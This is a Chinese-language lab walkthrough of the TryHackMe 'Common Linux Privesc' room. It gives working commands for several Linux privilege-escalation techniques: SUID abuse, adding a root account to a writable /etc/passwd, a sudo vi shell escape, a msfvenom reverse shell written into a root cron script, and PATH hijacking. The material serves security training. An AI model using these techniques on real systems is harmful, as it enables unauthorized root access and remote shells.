---
description: 本文相关内容：介绍一些常见的用于针对Linux机器进行权限提升的技术。
cover: ../../.gitbook/assets/D3pINJ3.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Common Linux Privesc(常见的Linux提权)

TryHackMe实验房间链接：[https://tryhackme.com/room/commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc)

## 了解 Privesc

Privesc是"privilege escalation"的缩写，意思是权限提升。

权限提升通常涉及从较低权限提升到较高权限。 从技术上讲，它是利用操作系统或应用程序中的漏洞、设计缺陷或配置错误来获得对通常限制用户访问的资源的未经授权的访问。

在进行 CTF 或实际渗透测试时，你很少能够直接获得一个为你提供管理员访问权限的立足点（初始访问权限），所以权限提升至关重要，因为它可以让你从低权限开始，来获得系统管理员级别的访问权限。获得一个高权限让你可以做很多事情，包括：

1. 重置密码；
2. 绕过访问控制以获得受保护的数据；
3. 编辑软件配置；
4. 取得持久性权限，以便你以后可以再次访问机器；
5. 更改用户权限；
6. 得到root账户下的一些关键文件，以及执行任何管理员或超级用户命令。

## 权限提升方向

权限树结构：

![image-20221008163352379](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008163352379.png)

有两种主要的权限提升变体:

**水平（横向）权限提升**：在这种情况下，你可以通过接管与你具有相同权限级别的不同用户来扩展你对已完成初步渗透的目标系统的影响，例如，一个普通用户账户劫持了另一个普通用户的账户（而不是将普通用户提升为超级用户）。 完成该操作，将允许你继承其他用户拥有的任何文件和访问权限，例如，这可以用来获取另一个普通用户的访问权限，如果该用户恰好有一个 SUID 文件附加到他的主目录中（稍后将详细介绍），就可以使用该文件来尝试获取超级用户的访问权限。

**垂直（纵向）权限提升**：这是你尝试使用已经获取的现有帐户来获得更高权限或者获取针对某些资源的特殊访问权限的情况。 对于本地权限提升攻击，这可能意味着尝试劫持具有管理员权限或 root 权限的帐户。

## 枚举

**LinEnum的介绍和获取**

LinEnum 是一个简单的 bash 脚本，它能够执行与权限提升相关的常见命令，能让你节省大量时间并专注于获取 root 权限。了解 LinEnum 执行的命令很重要，这样你就可以在无法使用 LinEnum 或其他类似脚本的情况下手动枚举 privesc （提权）漏洞。 在本文中，我们将解释使用LinEnum所得到的输出结果，以及可以使用哪些命令来替代LinEnum。

你可以从以下位置获取 LinEnum文件，添加到你的本地攻击机上：

> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
>
> 在linux机器上使用weget命令 后跟上面链接地址

在目标机器上获取 LinEnum文件有两种方法：

第一种方法：在攻击机上转到存储了本地 LinEnum 副本的目录，然后使用" python3 -m http.server 8000 "启动一个Python Web 服务器，接着在目标机器上使用" wget "命令加上你的本地 IP和LinEnum的文件名，这样就可以从攻击机上获取文件。在目标机上获取到文件之后，需要使用命令" chmod +x FILENAME.sh "让该文件有可执行权限。

![image-20221008170137432](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008170137432.png)

![image-20221008170209902](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008170209902.png)

另外一种方法：如果你无法传输文件，但是你又有足够的权限，你可以从本地攻击机上复制原始的 LinEnum 代码并将其粘贴到目标机上的一个新文件中，使用 Vi 或 Nano创建一个新文本文件。 完成复制粘贴操作后，再使用“.sh”扩展名保存文件，最后使用命令" chmod +x FILENAME.sh "让该文件有可执行权限。

![image-20221008170627088](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008170627088.png)

![image-20221008170700541](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008170700541.png)

**运行 LinEnum**

LinEnum可以像运行任何 bash 脚本一样运行，转到 LinEnum所在的目录并运行命令" ./LinEnum.sh "即可（记得给该文件赋予可执行权限） 。

tips：liunx执行 \*.sh 出现"目录或文件不存在"错误。

> 原因： 由于你写\*.sh的文件 是在windows ,然后在上传到liunx 服务器. windows 的编码格式是docs 而liunx 只能是unix.
>
> 解决办法：vim \*.sh 文件，通过 :set ff 你会发现该文件的格式fomat=docs，通过 :set ff=unix 修改，然后 :x或:wq 保存并退出即可。

**理解 LinEnum 的输出结果**

LinEnum 输出分为不同的部分，以下是我们将重点关注的主要部分：

Kernel ：内核信息显示在这里，可以研究这台机器是否存在可用的内核漏洞exp。

Can we read/write sensitive files：全局可写文件会显示在这里，这些文件是任何经过身份验证的用户都可以读取和写入的文件。 通过查看这些敏感文件的权限，我们可以看到哪里存在错误配置，使通常不应该能够写入的用户能够写入敏感文件。

SUID Files：SUID 文件的输出会显示在此处，我们可以研究这里面的一些子项来尝试提升权限。 SUID（在执行时会设置所有者用户 ID）是赋予文件的一种特殊类型的权限，它能允许文件以所有者的权限运行，如果文件归属于 root，那么该文件将以 root 权限运行，我们可以尝试使用SUID文件进行提权。

Crontab Contents：此处会显示已经计划好的 cron 作业（jobs），Cron 用于在特定时间安排命令，这些预定的命令或任务被称为“cron jobs”，与此相关的是 crontab 命令，它会创建一个 crontab 文件，其中包含要执行的cron 守护进程的命令和指令。 此处有足够的信息让我们能够尝试利用 Cronjobs。

在这个扫描中还包含了很多其他有用的信息，你可以自行阅读。

**答题**

首先，使用凭据 user3: password 通过SSH登录目标机器，这是为了模拟普通权限用户，假设我们在目标系统上已经获得了立足点。

![image-20221008205919472](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008205919472.png)

在LinEnum文件的目录下，使用攻击机的终端开启一个python webserver，然后在SSH界面使用" wget "命令下载攻击机上的LinEnum文件到目标机上：

```shell
#在攻击机的终端：
python3 -m http.server 8000
#在SSH界面：
wget http://10.14.30.69:8000/LinEnum.sh
```

![image-20221008210551252](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008210551252.png)

给目标上的LinEnum附加可执行权限，运行LinEnum：

```shell
chmod +x LinEnum.sh 
./LinEnum.sh 
```

![image-20221008212719280](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008212719280.png)

找到目标的主机名：

![image-20221008212837885](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008212837885.png)

> polobox
>
> 或者不使用LinEnum，在目标上执行命令：hostname

查看/etc/passwd 的输出结果，看一下目标系统上有多少个“ user \[ x ]”

![image-20221008212948136](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008212948136.png)

> 8
>
> 或者不使用LinEnum，在目标上执行命令：cat /etc/passwd

查看目标系统上有多少个可用的 shell

![image-20221008213123379](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008213123379.png)

> 4
>
> 或者不使用LinEnum，在目标上执行命令：cat /etc/shells

查看被 cron 设置为每5分钟运行一次的 bash 脚本的名称

![image-20221008213315327](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008213315327.png)

> autoscript.sh
>
> 或者不使用LinEnum，在目标上执行命令：cat /etc/crontab

查看哪个重要文件的权限发生了更改，以允许某些用户（属于root组的用户）对其进行写入

![image-20221008213740559](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008213740559.png)

> /etc/passwd
>
> 或者不使用LinEnum，在目标上执行命令：ls -la /etc/passwd

答题卡

![image-20221008213942723](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008213942723.png)

## 利用 SUID/GUID 文件

**查找和利用 SUID 文件**

Linux 权限提升利用的第一步是检查设置了 SUID/GUID 位的文件，只要设置了 SUID/GUID 位就意味着可以使用文件所有者/组的权限运行该文件，在这种情况下，如果某些设置了SUID/GUID位的文件是在超级用户权限下运行，我们就可以利用它们来获得具有这些权限的shell 。

**SUID/GUID二进制文件是什么？**

众所周知，在 Linux 中，所有东西都是一个文件，包括目录和设备，它们具有允许或限制三种操作的权限：read/write/execute（读/写/执行）。

请看以下示例，该示例拥有最大的权限(rwx-rwx-rwx):

user：文件所有者；group：同组用户；others：其他用户。

r = read；w = write；x = execute

![image-20221008230426381](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008230426381.png)

可用于为每个用户设置权限的最大数字为7，它是读(4)写(2)和执行(1)操作的组合，没有权限的位置用 -表示。例如，命令"chmod 755"，对应的权限是rwxr-xr-x 。

但是给予某些用户特殊权限时，权限可能就会变成SUID、SGID、SBIT。

当s这个标志（和rwx类似）出现在了文件拥有者（user）的x权限位置上，文件拥有者的权限就变成了**SUID** (Set user ID) 。

```
作用:
1.SUID权限仅对可执行文件有效
2.执行者对于该可执行文件需要具有x权限（本质上是s权限替换掉x权限，替换的前提是x权限必须要存在）
3.在执行过程中，实际调用者会暂时获得该文件的拥有者权限（比如普通权限用户暂时获得root权限）
4.该权限只在程序执行的过程中有效

SUID权限中的s有大小写之分，如果强行给没有x权限的普通文件添加s权限，那么显示的是大写的S，
这样显示的suid其实没什么用，因为原文件并不是可执行文件，只有给文件添加了x权限后，suid才有效。

权限添加方法：chmod u+x+s （如果已有x权限则使用 chmod u+s）
```

当s这个标志出现在文件所属组（group）的x权限位置上，文件所属组的权限就变成了**SGID** (Set Group ID)也叫**GUID**。

```
作用：
1.GUID权限既可以作用于目录，也可以作用于可执行文件
2.只要父目录有SGID权限，所有的子目录都会递归继承
3.执行者对于该可执行文件需要具有x权限
4.在执行过程中，调用者会暂时获得该文件的所属组权限

同样SGID的s权限也是分大小写的，当g权限组没有x权限的时候，设置SGID后就会变成大写的S，这点跟SUID一样。

权限添加方法：chmod g+x+s （如果已有x权限则使用 chmod g+s）
```

当t标志出现在其他组（others）的x权限位置时，表示其他组（others）具有**SBIT**的权限。

```
SBIT（Sticky Bit）目前只针对目录有效
SBIT对于目录的作用是：
当用户在该目录下建立文件或目录时，仅有自己与 root才有权力删除。 

最具有代表性的就是/tmp目录，任何人都可以在/tmp内增加、修改任意文件（因为权限全是rwx），
但除了root之外，仅有该文件/目录建立者能够删除属于自己的目录或文件。

权限t也有大小写之分，大写说明没有x权限，小写说明有x权限，这点和权限s是一样的。
```

**SUID/SGID/SBIT权限设置**

和rwx权限一样通过chmod命令设置，s、t有两种设置方法：

```
1、符号表示：SUID: u+s ，SGID: g+s，SBIT: o+t 
2、数字表示：SUID=4，SGID=2，SBIT=1，将原来的三位数扩展为四位数即可，把它们放在权限数字的最开头。
例如设置SUID，可以写成4777，设置SGID可以写成，2777，设置SBIT可以写成1777；
如果同时设置就是数字之和，例如suid，sgid和sbit都设置的话就是7777
```

因此，在查找 SUID /GUID（SGID）文件时，要查找的权限是：

SUID:rw**s**-rwx-rwx

GUID（SGID）:rwx-rw**s**-rwx

**查找 SUID/GUID 二进制文件**

由于LinEnum 的扫描结果，我们能够知道目标系统上是否存在具有 SUID/GUID功能的文件，但是，如果我们想手动完成这项工作，我们可以使用以下命令:

```shell
find / -perm -u=s -type f 2>/dev/null
```

该命令能在文件系统中搜索 SUID/GUID 文件，我们来分析一下这个命令：

* find：启动find“查找”命令
* /：搜索整个文件系统
* \-perm：搜索具有特定权限（permissions）的文件
* \-u=s：为文件设置何种权限位模式，这种形式接受符号模式（这里是s符号，代表为文件设置s权限位）
* \-type f：只搜索文件类型
* 2>/dev/null：将错误结果放到回收站 （2代表错误）

**答题**

在 user3的目录中，最突出的文件路径是什么？（以下截图是LinEnum的输出结果，也可以不使用LinEnum，在user3主目录下执行命令：ls）

![image-20221009002610526](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009002610526.png)

因为该shell文件有s权限，所以普通用户运行该文件时，可以短暂取得该文件的所有者的权限（shell文件的所有者是root），又因为该文件是shell类型，所以执行成功后，能进入拥有root权限的shell界面。

![image-20221009095311338](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009095311338.png)

答题卡

![image-20221009002831033](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009002831033.png)

## 利用可写的/etc/passwd文件

**利用可写的/etc/passwd**

通过 LinEnum 扫描，我们已经知道/etc/passwd 文件是group用户可写的，继续观察枚举得到的用户信息，我们发现 user7是 gid0的root组成员。因此，根据这一观察，我们得出结论：user7也可以编辑/etc/passwd 文件。

**理解/etc/passwd**

/etc/passwd 文件存储了登录过程中需要的基本信息，换句话说，它存储用户帐户信息。/etc/passwd 是一个纯文本文件，它包含系统帐户的列表，能为每个帐户提供一些有用的信息，如用户ID、组ID、主目录、 shell类型等。

一般用户对/etc/passwd文件应该具有读访问权限，因为许多命令和实用程序都会使用该文件 来将用户ID映射到用户名；但是，对/etc/passwd 文件的写访问权限 必须仅限于超级用户/root帐户。如果某个普通用户被错误地添加到允许写入etc/passwd文件的组中，我们就能以普通用户的权限写入/etc/passwd文件来创建一个root账户。

**理解/etc/passwd的格式**

/etc/passwd 文件每行包含一个条目对应的是系统的每个用户（用户账户）信息，passwd文件内容的所有字段由" : " 符号分隔，共有七个字段，通常情况下/etc/passwd 文件的条目格式如下所示:

```shell
test:x:0:0:root:/root:/bin/bash
#用冒号(:)分开
```

Username：用户登录时使用。长度应在1到32个字符之间。

Password：X 字符表示加密的密码存储在/etc/shadow 文件中。请注意，你需要使用 passwd 命令来计算在 CLI 中输入的密码的哈希值，或者在/etc/shadow 文件中存储/更新密码的哈希值，在上面例子中，密码散列（hash）被存储为“ x”。

User ID (UID)：必须为每个用户分配一个用户 ID (UID)，UID 0(零)是为 root 用户保留的，UID 1-99是为其他预定义帐户保留的，UID100-999被系统保留用于管理及系统帐户/组。

Group ID (GID)：主要的组 ID (存储在/etc/group 文件中)。

User ID Info：此处允许你添加有关用户的额外信息，例如用户的全名、电话号码等。该字段由finger命令使用。

Home directory：此处是用户登录时所在目录的绝对路径，如果这个目录不存在，那么用户目录就会变成/ 。

Command/shell：此处是命令或 shell 的绝对路径(如/bin/bash)。通常，这里会是一个shell，但是不一定总是shell。

**如何利用可写/etc/passwd**

如果我们有一个可写的/etc/passwd 文件，我们可以根据上面的格式写一行新的条目来创建一个新的root用户，我们可以添加我们自定义的密码hash，并将 UID、 GID 和 shell 都设置为和root账户相对应的参数，这样将允许我们创建一个新的root账户并能使用该账户进行登录。

如何创建自定义的密码hash，语法如下：

```shell
openssl passwd -1 -salt [salt] [password]
```

**答题**

使用以下命令创建自定义的密码hash，以供备用：

```shell
openssl passwd -1 -salt new 123
```

![image-20221009103749309](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009103749309.png)

> 创建的密码hash值为：$1$new$p7ptkEKU1HnaHpRtzNizS1

按规则设定新用户的内容格式（设定用户名为new），并将此行条目写入到/etc/passwd

```shell
#username:passwordhash:0:0:root:/root:/bin/bash
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

#使用nano打开并编辑/etc/passwd文件，在最后一行添加新用户的条目
nano /etc/passwd
```

![image-20221009111303021](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009111303021.png)

登录验证，查看是否已经得到root权限：

![image-20221009111455882](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009111455882.png)

答题卡

![image-20221009111558501](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009111558501.png)

## 转义Vi 编辑器

**sudo -l**

在 CTF 场景中，每次访问一个帐户时，都应该尝试使用“ sudo -l”命令来列出作为该帐户的超级用户（root）可以使用的命令。有时候，你会发现你能够以 root 用户的身份运行某些命令，而不需要 root 密码，那么此处就可以用来利用以便提权。

**转义 Vi 编辑器**

在“ user8”帐户上运行sudo -l，如果结果表明这个用户可以使用 root 权限运行 vi且不需要root密码，那么这将允许我们通过转义 vim来提升权限，我们能够作为 root 权限用户获得一个shell界面（通过sudo vi，然后在编辑器界面输入" :!sh "实现转义）。

**错误配置的二进制文件和 GTFOBins**

如果你在枚举过程中发现一个配置错误的二进制文件，或者当你在检查已获取的用户帐户能访问哪些二进制文件时，你都可以通过GTFOBins来查找哪些二进制文件存在可利用的空间并查看如何进行利用。

GTFOBins 是一个由 Unix 二进制文件组成的列表，攻击者可以尝试利用这些列表中的二进制文件来绕过本地安全限制，GTFOBins 还会提供关于如何利用配置错误的二进制文件的分析讲解。

GTFOBins参考链接：https://gtfobins.github.io/

**答题**

在user8账户下执行sudo -l命令，发现user8能够使用root权限执行vi（而且不需要密码）

![image-20221009113609301](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009113609301.png)

输入sudo vi命令打开vi编辑器（vim），然后按Shift键加" : " 并输入" !sh "，实现vi编辑器转义，打开一个root权限的shell界面：

![image-20221009114125899](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009114125899.png)

![image-20221009114152492](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009114152492.png)

答题卡

![image-20221009114746463](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009114746463.png)

## 利用 Crontab

**什么是Cron**

Cron 守护进程是一个长时间运行的进程，它会在特定的日期和时间执行命令，你可以使用它来安排活动（按照规定的时间--执行多个命令），或者安排一次性事件（在某个时间点--执行一次命令），或者安排重复性任务（按照规定的时间--多次执行一个命令）。你可以创建一个 crontab 文件，其中会包含 Cron 守护进程要执行的命令和程序。

**如何查看活动的 Cronjobs**

我们可以用"**cat /etc/crontab**"命令来查看具体规划了哪些 cron jobs。只要有机会，就应该手动检查这一点（cronjob），尤其是在运行 LinEnum 或其他类似的脚本没有找到任何东西的情况下。

**Cronjob 的格式**

Cronjob 以某种格式存在，如果你想利用cron job，那么能够读懂该格式就非常有必要。

```
# = ID 任务编号

m = Minute 在某分钟运行

h = Hour 在某小时运行

dom = Day of the month 在每个月的某一天运行

mon = Month 在某个月运行

dow = Day of the week 在每个星期的某一天运行

user = 命令将作为什么用户运行

command = 应该运行什么命令
```

例子

```
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

**我们如何利用这一点？**

通过 LinEnum 扫描，我们知道 user4桌面上的文件 autoscript.sh 计划每五分钟会运行一次，这个文件由 root 所拥有，这意味着它将以 root 特权运行，但是同时我们也有这个文件的写入权限。

接下来的任务是创建一个命令（弄一个反向shell的payload），该命令将返回一个 shell ，我们将其粘贴到该文件（autoscript.sh ）中，当文件在五分钟后再次运行时，那么我们粘贴到文件中的命令也将以 root 用户身份运行，使用攻击机终端上的netcat监听器接收shell，这样我们就能得到一个root权限的shell界面。

**答题**

找到目标文件的位置：

![image-20221009175605200](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009175605200.png)

> 此处建议使用命令：cat /etc/crontab

使用msfvenom生成一个反向shell的payload，将该payload内容复制粘贴到定时执行的文件中：

```shell
# msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.198.162 lport=8888 R

echo "[MSFVENOM OUTPUT]" > autoscript.sh
```

![image-20221009180407008](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009180407008.png)

![image-20221009180725586](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009180725586.png)

在攻击机终端设置netcat监听器，并捕获shell：

```shell
#此处端口和之前生成的payload端口对应
nc -lvnp 8888
```

![image-20221009180914579](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009180914579.png)

答题卡

![image-20221009180952740](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009180952740.png)

## 利用PATH 变量

**什么是 PATH？**

PATH 是 Linux 和类 Unix 操作系统中的一个环境变量，它指定保存可执行程序的目录。当用户在终端中运行任何命令时，系统会在 PATH 变量的帮助下搜索可执行文件，以响应用户执行的命令。

在" echo $PATH "命令的帮助下查看相关用户的 Path 非常简单。

**这怎么能让我们提升特权呢？**

假设我们有一个 SUID 二进制文件，运行它，我们可以看到它正在调用系统 shell 来执行一个基本的进程，比如带“ ps”的列表进程。与前面的 SUID 示例不同,在这种情况下，我们不能通过为命令注入提供参数来利用它，那么我们能做些什么来尝试和利用它呢？

我们可以将 PATH 变量重写到我们选择的位置，因此，当 SUID 二进制程序调用系统 shell 来运行一个可执行文件时，它会运行一个我们自己编写的可执行文件！

与任何 SUID 文件一样，它将使用与 SUID 文件所有者相同的权限运行此命令！如果该SUID文件的所有者是root，使用这个方法，我们就可以作为 root 来运行任何我们想要执行的命令！

**答题**

在user5账户的主目录下(可以使用cd \~)，运行script文件：

![image-20221009182112006](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009182112006.png)

可以发现该文件应该是调用了 ls命令，因为该文件的执行效果和 ls命令一样。

现在切换到tmp目录下，创建一个包含命令的可执行文件：

```shell
cd /tmp/
#格式：
#echo "[whatever command we want to run]" > [name of the executable we're imitating]        # imitating--假冒

#用启动shell的命令来假冒ls命令 >>表示追加内容到指定文件内容中 此处选择的shell是bash类型的shell
echo "/bin/bash" >> ls
#附加可执行权限
chmod +x ls
```

![image-20221009183906857](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009183906857.png)

现在，我们需要更改 PATH 变量，以便它能够指向假冒的“ ls”文件所在的目录！我们使用以下命令完成此操作：

```shell
export PATH=/tmp:$PATH
```

注意：这将导致你之后每次使用“ ls”时都会打开一个bash shell（权限不会改变），如果你想在完成PATH变量利用之前使用真正的" ls "命令，请用"/bin/ls"命令代替。

![image-20221009190812110](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009190812110.png)

更改好PATH变量之后，回到user5账户的主目录下，运行script文件，**由于该文件是一个SUID文件且所有者为root，所以运行该文件之后，你将获得一个root权限**：

```
cd ~
./script
```

![image-20221009190603151](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009190603151.png)

一旦完成了PATH变量利用，你就可以退出 root 并使用以下命令将 PATH 变量重置为默认值，此时你可以重新正常使用ls命令：

```shell
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
```

![image-20221009190945178](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009190945178.png)

答题卡

![image-20221009184004067](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221009184004067.png)

## 知识拓展

**进一步学习**

在 Linux Privilege Escalation 这个巨大的领域中，从来没有一个“神奇”的答案。 本文所涉及的知识点只是一些在尝试提升权限时需要注意的基本事项示例，熟悉提权的唯一方法是练习和积累经验。

建立清单是确保你在提权的枚举阶段没有遗漏关键内容的好方法，并且还可以为你提供复习资源，以在你忘记确切使用哪些命令时进行回顾学习。

以下是适用于 CTF 或渗透测试用例的清单列表，当然最好的选择还是尝试制作自己的笔记清单（部分链接可能存在内容失效）：

* https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_-\_linux.html
* https://payatu.com/guide-linux-privilege-escalation
